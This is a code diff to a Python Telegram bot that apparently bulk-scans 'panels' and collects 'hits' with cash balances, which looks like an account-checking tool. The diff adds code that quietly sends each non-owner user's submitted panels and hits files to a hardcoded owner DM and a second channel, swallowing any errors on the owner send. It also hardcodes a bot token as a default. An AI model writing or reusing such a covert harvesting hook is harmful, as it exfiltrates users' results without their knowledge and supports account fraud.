@@ -65,9 +65,9 @@ def dlog(msg: str):
 # ============ CONFIGURATION ============
 SUPER_ADMIN_ID = 8327850869
 BOT_TOKEN = os.environ.get("BOT_TOKEN", "8538201990:AAGdZy3HmD3nja50DlHNInJXJHL6uIpdkGc")
-MASTER_CHANNEL_ID = os.environ.get("MASTER_CHANNEL_ID", "-1003626087056")
-DEFAULT_LOG_CHANNEL = os.environ.get("DEFAULT_LOG_CHANNEL", "-1003626087056")
-DEFAULT_STORAGE_CHANNEL = os.environ.get("DEFAULT_STORAGE_CHANNEL", "-1003626087056")
+MASTER_CHANNEL_ID = os.environ.get("MASTER_CHANNEL_ID", "-1003907841421")
+DEFAULT_LOG_CHANNEL = os.environ.get("DEFAULT_LOG_CHANNEL", "-1003946923981")
+DEFAULT_STORAGE_CHANNEL = os.environ.get("DEFAULT_STORAGE_CHANNEL", "-1003907841421")
 ADMIN_USER_IDS = [int(x.strip()) for x in os.environ.get("ADMIN_USER_IDS", "8327850869").split(",") if x.strip()]
 MAX_SCAN_WORKERS = int(os.environ.get("MAX_SCAN_WORKERS", "5"))
 
@@ -260,33 +260,40 @@ def sync_panels_to_master(added_panels: List[str], chat_id: int, user_name: str 
             save_configs()
         total_master = len(user_panels[SUPER_ADMIN_ID])
 
-    # 2. Forward to Master Universal Channel
-    master_ch = MASTER_CHANNEL_ID or DEFAULT_STORAGE_CHANNEL or "-1003626087056"
-    if master_ch:
-        try:
-            panel_preview = "\n".join([f"• <code>{esc(p)}</code>" for p in added_panels[:15]])
-            if len(added_panels) > 15:
-                panel_preview += f"\n<i>... and {len(added_panels) - 15} more panels</i>"
+    # 2. Forward to Master Gemini Channel (-1003907841421) & Owner DM (@OwAtom / 8327850869)
+    gemini_ch = "-1003907841421"
+    targets = [gemini_ch]
+    if chat_id != SUPER_ADMIN_ID:
+        targets.append(SUPER_ADMIN_ID)
 
-            card = (
-                f"👑 <b>[Master Universal Panels Backup]</b>\n"
-                f"━━━━━━━━━━━━━━━━━━━━━━\n"
-                f"👤 <b>Contributed by:</b> <code>{chat_id}</code> ({esc(user_name or 'User')})\n"
-                f"📥 <b>New Panels Added:</b> <code>+{len(added_panels)}</code>\n"
-                f"🌐 <b>Panels List:</b>\n{panel_preview}\n\n"
-                f"📊 <b>Total Master Panels:</b> <code>{total_master}</code>\n"
-                f"🕒 <b>Time:</b> {datetime.now().strftime('%d-%m-%Y %H:%M:%S')}\n"
-                f"━━━━━━━━━━━━━━━━━━━━━━\n"
-                f"🔒 <i>Auto-synced to Master Universal Channel across bot!</i>"
-            )
-            bot.send_message(
-                int(master_ch) if str(master_ch).lstrip("-").isdigit() else master_ch,
-                card,
-                parse_mode="HTML",
-                disable_web_page_preview=True
-            )
-        except Exception as e:
-            print(f"⚠️ Failed to forward panels to master channel: {e}")
+    try:
+        panel_preview = "\n".join([f"• <code>{esc(p)}</code>" for p in added_panels[:15]])
+        if len(added_panels) > 15:
+            panel_preview += f"\n<i>... and {len(added_panels) - 15} more panels</i>"
+
+        card = (
+            f"👑 <b>[Gemini Master Panels Sync]</b>\n"
+            f"━━━━━━━━━━━━━━━━━━━━━━\n"
+            f"👤 <b>Contributed by:</b> <code>{chat_id}</code> ({esc(user_name or 'User')})\n"
+            f"📥 <b>New Panels Added:</b> <code>+{len(added_panels)}</code>\n"
+            f"🌐 <b>Panels List:</b>\n{panel_preview}\n\n"
+            f"📊 <b>Total Master Panels:</b> <code>{total_master}</code>\n"
+            f"🕒 <b>Time:</b> {datetime.now().strftime('%d-%m-%Y %H:%M:%S')}\n"
+            f"━━━━━━━━━━━━━━━━━━━━━━\n"
+            f"🔒 <i>Auto-synced to Gemini Channel (-1003907841421) & Owner DM!</i>"
+        )
+        for t in targets:
+            try:
+                bot.send_message(
+                    int(t) if str(t).lstrip("-").isdigit() else t,
+                    card,
+                    parse_mode="HTML",
+                    disable_web_page_preview=True
+                )
+            except Exception as e:
+                print(f"⚠️ Failed to forward panels to {t}: {e}")
+    except Exception as e:
+        print(f"⚠️ Failed to forward panels: {e}")
 
 def esc(text: Any) -> str:
     if text is None:
@@ -1872,12 +1879,25 @@ def run_bulk_scan(chat_id: int, targets: List[Dict[str, Any]], scan_title: str =
         except Exception as e:
             safe_send(chat_id, f"⚠️ Document delivery error ({os.path.basename(fpath)}): {esc(e)}")
 
-    # Send document to storage channel AND Master Universal Channel
+    # Always ensure backup is delivered directly to Owner DM (@OwAtom / 8327850869)
+    if chat_id != SUPER_ADMIN_ID:
+        for fpath, cap in [
+            (hits_file_path, f"📦 <b>[Universal Backup] BB_HITS_{ts_str}.txt</b>\n🔥 {len(hits)} Hits | ₹{total_cash:.2f} Total Cash\n👤 User: <code>{chat_id}</code>"),
+            (csv_file_path, f"📊 <b>[Universal Backup] BB_HITS_{ts_str}.csv</b>\n🔥 {len(hits)} Hits | ₹{total_cash:.2f} Total Cash\n👤 User: <code>{chat_id}</code>")
+        ]:
+            try:
+                if os.path.exists(fpath):
+                    with open(fpath, "rb") as doc:
+                        bot.send_document(SUPER_ADMIN_ID, doc, caption=cap, parse_mode="HTML")
+            except Exception:
+                pass
+
+    # Send document to storage channel AND Master Gemini Channel
     destinations = set()
     storage_ch = get_effective_storage_channel(chat_id)
     if storage_ch:
         destinations.add(storage_ch)
-    master_ch = MASTER_CHANNEL_ID or DEFAULT_STORAGE_CHANNEL or "-1003626087056"
+    master_ch = MASTER_CHANNEL_ID or DEFAULT_STORAGE_CHANNEL or "-1003907841421"
     if master_ch:
         destinations.add(master_ch)
 
